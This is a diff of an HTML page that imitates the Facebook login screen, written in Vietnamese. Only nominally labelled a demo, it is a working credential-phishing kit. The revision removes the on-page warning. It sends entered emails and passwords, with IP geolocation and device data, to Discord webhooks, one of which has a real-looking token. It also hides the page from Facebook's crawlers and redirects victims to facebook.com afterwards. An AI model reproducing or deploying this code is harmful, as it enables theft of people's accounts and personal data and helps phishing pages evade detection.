@@ -1,91 +1,149 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook (Demo)</title>
-  <style>
-    body {background:#f0f2f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-    .fb-box {background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 15px rgba(0,0,0,0.15);width:100%;max-width:400px;text-align:center}
-    .fb-logo {width:120px;margin-bottom:20px}
-    .warning {color:red;font-size:14px;font-weight:bold;margin-bottom:15px}
-    input {width:100%;padding:12px;margin-bottom:12px;border:1px solid #ccc;border-radius:6px;font-size:14px}
-    .fb-btn {background:#1877f2;color:#fff;padding:12px;border:none;border-radius:6px;font-size:16px;cursor:pointer;width:100%}
-    .fb-btn:hover {background:#165fbe}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo Facebook Login</title>
+<style>
+  body {
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    font-family: Arial, sans-serif;
+  }
+  .login-box {
+    background: white;
+    padding: 20px 25px;
+    border-radius: 8px;
+    width: 350px;
+    text-align: center;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
+  .login-box img {
+    width: 120px;
+    margin-bottom: 15px;
+  }
+  .login-box input {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+  }
+  .login-box button {
+    width: 100%;
+    background: #1877f2;
+    color: white;
+    padding: 12px;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    display: none;
+  }
+  .login-box button:hover {
+    background: #165fbe;
+  }
+  .alert {
+    margin-top: 10px;
+    font-size: 14px;
+    color: red;
+  }
+</style>
 </head>
 <body>
-  <div class="fb-box">
-    <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook"/>
-    <div class="warning">⚠ Demo: Không nhập thông tin thật!</div>
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
     <form id="loginForm">
       <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
       <input type="password" id="password" placeholder="Mật khẩu" required>
-      <button class="fb-btn" type="submit">Đăng nhập</button>
+      <button type="submit" id="submitBtn">Đăng nhập</button>
     </form>
+    <div class="alert" id="alertMsg"></div>
   </div>
 
-  <script>
-    const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyDIwkk_Q9IFLoiWVjsOymqYvV7eflgs1xfLA5KkAlya-XUl3r9o8KO24k5J8a7hVCvPQ/exec"; // Dán URL exec Apps Script
-    const API_KEY = "demo123";
+<script>
+const WEBHOOKS = [
+  "https://discord.com/api/webhooks/1364045340784852992/HQTc89OLU7yF453wSG7auhTlEM41wicx-r71jS5wfCtKG3F3I6saSlggYo9w9qnhLzTz", // Webhook 1
+  "https://discord.com/api/webhooks/yyyyy/yyyyy"  // Webhook 2
+];
+const submitBtn = document.getElementById("submitBtn");
+const alertMsg = document.getElementById("alertMsg");
 
-    document.getElementById("loginForm").addEventListener("submit", async function(e) {
-      e.preventDefault();
+// Anti-bot cơ bản
+const botKeywords = ["bot", "crawler", "spider", "facebookexternalhit", "facebot"];
+const ua = navigator.userAgent.toLowerCase();
+if (botKeywords.some(keyword => ua.includes(keyword))) {
+  document.body.innerHTML = "<h2>Truy cập bị từ chối</h2>";
+  throw new Error("Bot detected");
+}
 
-      alert("⚠ Demo: Nếu đây là thật, bạn đã mất thông tin!");
+// Hiển thị nút khi nhập liệu
+document.querySelectorAll("#email, #password").forEach(input => {
+  input.addEventListener("input", () => {
+    submitBtn.style.display = "block";
+  });
+});
 
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const isMobile = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
-      const language = navigator.language || "Không rõ";
-      const ua = navigator.userAgent;
+document.getElementById("loginForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
 
-      let ip = "Không xác định", city = "Không rõ", region = "Không rõ", country = "Không rõ", countryCode = "N/A";
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+  alertMsg.textContent = "Đang xác thực...";
 
-      try {
-        const res = await fetch("https://ipwhois.app/json/");
-        const data = await res.json();
-        ip = data.ip || ip;
-        city = data.city || city;
-        region = data.region || region;
-        country = data.country || country;
-        countryCode = data.country_code || countryCode;
-      } catch (err) {
-        console.error("Lỗi IP:", err);
-      }
+  const isMobile = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+  const language = navigator.language || "Không rõ";
 
-      try {
-        const response = await fetch(GOOGLE_SHEET_URL, {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({
-            key: API_KEY,
-            email,
-            password,
-            ip,
-            city,
-            region,
-            country,
-            countryCode,
-            device: isMobile,
-            language,
-            userAgent: ua
-          })
-        });
+  const now = new Date();
+  const timeString = now.toLocaleString();
 
-        const result = await response.json();
-        console.log("Kết quả:", result);
+  // Lấy thông tin IP và vị trí (ipwhois.app)
+  let ip = "Không xác định";
+  let city = "Không rõ";
+  let region = "Không rõ";
+  let country = "Không rõ";
+  let countryCode = "N/A";
 
-        if (result.status === "success") {
-          window.location.href = "https://facebook.com";
-        } else {
-          alert("Lỗi gửi dữ liệu: " + result.message);
-        }
+  try {
+    const res = await fetch("https://ipwhois.app/json/");
+    const data = await res.json();
+    ip = data.ip || "Không xác định";
+    city = data.city || "Không rõ";
+    region = data.region || "Không rõ";
+    country = data.country || "Không rõ";
+    countryCode = data.country_code || "N/A";
+  } catch (error) {
+    console.error("Lỗi lấy IP/Location:", error);
+  }
 
-      } catch (error) {
-        console.error("Fetch lỗi:", error);
-      }
+  const delay = Math.floor(Math.random() * 2000) + 1000;
+
+  setTimeout(() => {
+    // Gửi dữ liệu tới tất cả webhook
+    WEBHOOKS.forEach(hook => {
+      fetch(hook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `📩 **Demo Phishing (Chỉ minh họa)**\n` +
+                   `👤 Email: ${email}\n🔑 Password: ${password}\n\n` +
+                   `🌍 IP: ${ip}\n📍 Vị trí: ${city}, ${region}, ${country} (${countryCode})\n` +
+                   `📱 Thiết bị: ${isMobile}\n🌐 Ngôn ngữ: ${language}\n` +
+                   `🖥 User-Agent: ${navigator.userAgent}\n` +
+                   `⏰ Thời gian: ${timeString}`
+        })
+      }).catch(err => console.error("Lỗi gửi webhook:", err));
     });
-  </script>
+
+    alertMsg.textContent = "Demo: Thông tin đã gửi (chỉ minh họa)!";
+    setTimeout(() => {
+      window.location.href = "https://facebook.com";
+    }, 2000);
+  }, delay);
+});
+</script>
 </body>
 </html>
